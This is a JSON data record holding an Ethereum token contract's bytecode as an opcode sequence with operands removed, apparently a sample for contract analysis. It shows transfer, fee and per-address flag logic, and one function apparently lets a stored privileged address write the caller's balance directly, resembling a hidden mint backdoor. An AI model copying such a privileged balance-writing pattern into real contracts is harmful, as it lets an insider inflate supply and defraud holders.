{
  "opcode_sequence": "PUSH1 PUSH1 MSTORE PUSH1 CALLDATASIZE LT PUSH2 JUMPI PUSH1 CALLDATALOAD PUSH1 SHR DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST CALLDATASIZE PUSH2 JUMPI PUSH32 PUSH1 MLOAD PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 STOP JUMPDEST PUSH1 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST STOP JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST STOP JUMPDEST PUSH1 PUSH1 MLOAD DUP1 PUSH1 ADD PUSH1 MSTORE DUP1 PUSH1 DUP2 MSTORE PUSH1 ADD PUSH32 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH2 PUSH2 PUSH2 JUMP JUMPDEST DUP5 DUP5 PUSH2 JUMP JUMPDEST PUSH1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH2 DUP5 DUP5 DUP5 PUSH2 JUMP JUMPDEST PUSH2 DUP5 PUSH2 PUSH2 JUMP JUMPDEST PUSH2 DUP6 PUSH1 MLOAD DUP1 PUSH1 ADD PUSH1 MSTORE DUP1 PUSH1 DUP2 MSTORE PUSH1 ADD PUSH2 PUSH1 SWAP2 CODECOPY PUSH1 PUSH1 DUP12 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 PUSH1 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH2 PUSH2 PUSH2 JUMP JUMPDEST DUP5 PUSH2 DUP6 PUSH1 PUSH1 PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP10 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 PUSH2 PUSH2 JUMP JUMPDEST DUP3 PUSH2 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 SLOAD CALLER EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH1 MLOAD CALLER DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 DUP2 SHA3 DUP3 DUP2 SSTORE PUSH1 DUP1 MUL PUSH1 SSTORE POP POP POP JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 PUSH2 EXP DUP2 SLOAD DUP2 PUSH1 MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH2 PUSH2 PUSH2 JUMP JUMPDEST ADDRESS DUP4 PUSH2 JUMP JUMPDEST PUSH2 DUP2 CALLVALUE PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 PUSH2 EXP DUP2 SLOAD DUP2 PUSH1 MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 DUP4 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH2 PUSH1 PUSH2 JUMP JUMPDEST JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH2 PUSH1 DUP2 SWAP1 SSTORE POP PUSH2 PUSH1 DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH2 PUSH2 PUSH1 SLOAD PUSH1 SLOAD PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 DUP1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH1 MLOAD DUP1 PUSH1 ADD PUSH1 MSTORE DUP1 PUSH1 DUP2 MSTORE PUSH1 ADD PUSH32 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH2 PUSH2 PUSH2 JUMP JUMPDEST DUP5 PUSH2 DUP6 PUSH1 MLOAD DUP1 PUSH1 ADD PUSH1 MSTORE DUP1 PUSH1 DUP2 MSTORE PUSH1 ADD PUSH2 PUSH1 SWAP2 CODECOPY PUSH1 PUSH1 PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP11 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH2 PUSH2 PUSH2 JUMP JUMPDEST DUP5 DUP5 PUSH2 JUMP JUMPDEST PUSH1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH1 AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 DUP5 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP4 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH20 AND DUP2 PUSH20 AND SUB PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 DUP2 DUP4 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH20 AND DUP4 PUSH20 AND SUB PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 PUSH20 AND DUP3 PUSH20 AND SUB PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 PUSH1 DUP6 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP5 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 AND DUP4 PUSH20 AND PUSH32 DUP4 PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH2 DUP4 DUP4 DUP4 PUSH2 JUMP JUMPDEST PUSH1 DUP1 PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND DUP6 PUSH20 AND EQ ISZERO DUP1 ISZERO PUSH2 JUMPI POP PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND DUP5 PUSH20 AND EQ ISZERO JUMPDEST ISZERO PUSH2 JUMPI PUSH1 PUSH1 DUP7 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH1 AND ISZERO DUP1 ISZERO PUSH2 JUMPI POP PUSH1 PUSH1 DUP6 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH1 AND ISZERO JUMPDEST ISZERO PUSH2 JUMPI PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND DUP6 PUSH20 AND EQ DUP1 ISZERO PUSH2 JUMPI POP PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND DUP5 PUSH20 AND EQ ISZERO JUMPDEST DUP1 ISZERO PUSH2 JUMPI POP PUSH1 PUSH1 DUP6 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH1 AND ISZERO JUMPDEST DUP1 ISZERO PUSH2 JUMPI POP PUSH1 PUSH1 DUP7 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH1 AND ISZERO JUMPDEST ISZERO PUSH2 JUMPI PUSH2 PUSH2 PUSH2 PUSH1 SLOAD PUSH1 SLOAD PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST DUP4 GT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 PUSH2 PUSH2 PUSH1 SLOAD PUSH1 SLOAD PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH2 DUP5 PUSH2 DUP8 PUSH2 JUMP JUMPDEST PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST GT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMPDEST PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND DUP5 PUSH20 AND EQ DUP1 ISZERO PUSH2 JUMPI POP ADDRESS PUSH20 AND DUP6 PUSH20 AND EQ ISZERO JUMPDEST ISZERO PUSH2 JUMPI PUSH2 PUSH2 PUSH2 PUSH1 SLOAD DUP7 PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST SWAP2 POP PUSH2 PUSH2 PUSH2 PUSH1 SLOAD DUP7 PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST SWAP1 POP NUMBER PUSH1 PUSH1 ORIGIN PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP JUMPDEST PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND DUP6 PUSH20 AND EQ DUP1 ISZERO PUSH2 JUMPI POP PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND DUP5 PUSH20 AND EQ ISZERO JUMPDEST ISZERO PUSH2 JUMPI PUSH2 PUSH2 PUSH2 PUSH1 SLOAD DUP7 PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST SWAP2 POP PUSH2 PUSH2 PUSH2 PUSH1 SLOAD DUP7 PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST SWAP1 POP NUMBER PUSH1 PUSH1 ORIGIN PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP JUMPDEST JUMPDEST JUMPDEST PUSH1 PUSH2 DUP3 DUP5 PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST SWAP1 POP PUSH1 DUP2 GT ISZERO PUSH2 JUMPI PUSH1 DUP4 GT ISZERO PUSH2 JUMPI PUSH2 DUP7 DUP5 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 DUP3 GT ISZERO PUSH2 JUMPI PUSH2 DUP3 PUSH1 PUSH1 PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH1 PUSH1 PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND DUP7 PUSH20 AND PUSH32 DUP5 PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 JUMPDEST PUSH2 DUP2 DUP6 PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST SWAP4 POP JUMPDEST PUSH2 DUP5 PUSH1 MLOAD DUP1 PUSH1 ADD PUSH1 MSTORE DUP1 PUSH1 DUP2 MSTORE PUSH1 ADD PUSH2 PUSH1 SWAP2 CODECOPY PUSH1 PUSH1 DUP11 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH1 PUSH1 DUP9 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP PUSH2 DUP5 PUSH1 PUSH1 DUP9 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH1 PUSH1 DUP8 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP DUP5 PUSH20 AND DUP7 PUSH20 AND PUSH32 DUP7 PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP DUP3 DUP5 SUB SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 PUSH20 AND DUP3 PUSH20 AND SUB PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 DUP2 PUSH1 MLOAD DUP1 PUSH1 ADD PUSH1 MSTORE DUP1 PUSH1 DUP2 MSTORE PUSH1 ADD PUSH2 PUSH1 SWAP2 CODECOPY PUSH1 PUSH1 DUP7 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH1 PUSH1 DUP5 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP PUSH2 DUP2 PUSH1 SLOAD PUSH2 SWAP1 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH1 DUP2 SWAP1 SSTORE POP PUSH1 PUSH20 AND DUP3 PUSH20 AND PUSH32 DUP4 PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND EQ PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH2 ADDRESS PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND DUP5 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND PUSH4 DUP3 ADDRESS DUP6 PUSH1 DUP1 PUSH2 PUSH2 JUMP JUMPDEST TIMESTAMP PUSH1 MLOAD DUP9 PUSH4 AND PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP7 SWAP6 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 GAS CALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP POP 